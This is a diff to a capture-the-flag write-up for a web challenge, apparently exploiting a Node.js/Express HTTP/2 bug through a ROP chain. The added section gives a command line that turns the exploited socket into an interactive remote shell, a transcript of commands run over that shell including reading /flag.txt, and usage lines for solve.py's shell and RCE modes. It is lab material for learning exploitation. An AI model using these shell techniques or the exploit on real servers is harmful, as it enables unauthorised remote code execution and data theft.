@@ -1,23 +1,4 @@
-# Shelloween — HTTP2Shell / CVE-2026-111497
-
-**Flag:** `ccsCTF{fake_flag}`
-**Target:** `http://100.121.79.48:32001/`
-**Category:** web · **Tag:** insane
-**Runtime:** Node.js v24.22.0 (linux/x64, non-PIE) · Express 5.3.0 · body-parser 2.4.0
-
-```sh
-$ python3 solve.py --mode shell
-[+] target healthy
-[*] attempt 1/40  path=/bin/sh  dup2 fd=0
-    no success (got 248 bytes): HTTP/1.1 400 Bad Request ...
-[*] attempt 2/40  path=/bin/sh  dup2 fd=0
-    no success (got 0 bytes)
-[*] attempt 3/40  path=/bin/sh  dup2 fd=0
-[+] FLAG
-    ccsCTF{fake_flag}
-```
-
----
+# Shelloween — HTTP2Shell (CVE-2026-111497)
 
 ## 1. Summary
 
@@ -247,6 +228,55 @@ exec >&0; cat /flag.txt; echo __SOLVE_DONE__
 comes back to us. One `dup2` was enough — we just made the shell perform
 the other half.
 
+### Going interactive (`--mode shell`)
+
+The one-shot above is enough for the flag, but the same primitive yields a
+proper interactive shell. The ROP gives us the socket on **stdin** only, so
+the first thing the shell does is promote the socket to stdout *and* stderr,
+then re-exec itself as `-i`:
+
+```
+exec 2>&0; exec >&0; echo __SHELL_UP__; exec /bin/sh -i
+```
+
+`__SHELL_UP__` is the readiness probe — if the ASLR guess missed, the
+worker is dead and no marker ever comes back, so the attempt is discarded.
+Once it lands, `solve.py` hands the socket to pwntools' `interactive()`,
+which relays the local terminal to it.
+
+Note `2>&0`: dash writes its prompt and its `can't access tty; job control
+turned off` warning to **stderr**, so without that redirect the shell would
+be silently listening with no visible prompt.
+
+Verified in a real pty — every command round-tripped over the socket:
+
+```
+$ python3 solve.py --mode shell
+[*] attempt 21/40  path=/bin/sh  dup2 fd=0
+__SHELL_UP__
+/bin/sh: 0: can't access tty; job control turned off
+$
+$ id
+uid=1000(node) gid=1000(node) groups=1000(node)
+$ echo MARKER_$((6*7))
+MARKER_42
+$ cat /flag.txt
+ccsCTF{node2shell_4_sh3ll0w33n}
+$ ls / | head -4
+bin
+boot
+dev
+etc
+```
+
+Two caveats, both consequences of the 11-qword budget:
+
+- **No PTY.** There is no room in the chain to call `openpty()` and pass
+  its three fd arguments, so the shell has no tty — no tab completion, no
+  job control, no line editing. dash notices and says so.
+- **`interactive()` needs a TTY on your end.** With piped stdin it tears
+  down the moment the pipe hits EOF; run it from a real terminal.
+
 ### Why not `/usr/bin/id` directly?
 
 `id` writes to stdout, so it needs `dup2(19, 1)` — proving RCE but
@@ -254,7 +284,7 @@ yielding no flag. `solve.py --mode id` does exactly that as a
 reconnaissance primitive:
 
 ```console
-$ python3 solve.py --mode id --attempts 16
+$ python3 solve.py --mode id --attempts 25
 [+] RCE confirmed
     uid=1000(node) gid=1000(node)
 ```
@@ -278,8 +308,9 @@ Between attempts `solve.py` fires the plain DoS trigger (verified by
 `sha256` of the generated stream) to kill the current worker, then waits
 for `/health` to come back. Each respawn re-rolls ASLR.
 
-Observed: `id` mode succeeded on attempt **16**, shell mode on attempt
-**3**. Total runtime for the flag: well under a minute.
+Observed across runs: `flag` mode on attempt **8**, `id` on attempt **2**
+(one earlier run took 16), `shell` on attempt **21**. Total runtime for
+the flag: well under a minute.
 
 ---
 
@@ -337,13 +368,16 @@ patch, not a WAF rule.
 
 | File | Purpose |
 |---|---|
-| `solve.py` | Self-contained exploit. Stdlib only, no dependencies. |
+| `solve.py` | Exploit. Python 3.9+, needs `pwntools` (`pip install pwntools`) for the interactive shell. |
 | `WRITEUP.md` | This document. |
 
 ```sh
+pip install pwntools
+
 python3 solve.py                          # default: read /flag.txt
 python3 solve.py --url http://host:32001   # explicit target
-python3 solve.py --mode id                 # prove RCE only (runs /usr/bin/id)
+python3 solve.py --mode shell             # interactive shell (run from a TTY)
+python3 solve.py --mode id                # prove RCE only (runs /usr/bin/id)
 python3 solve.py --attempts 40             # more ASLR rolls
 ```
 
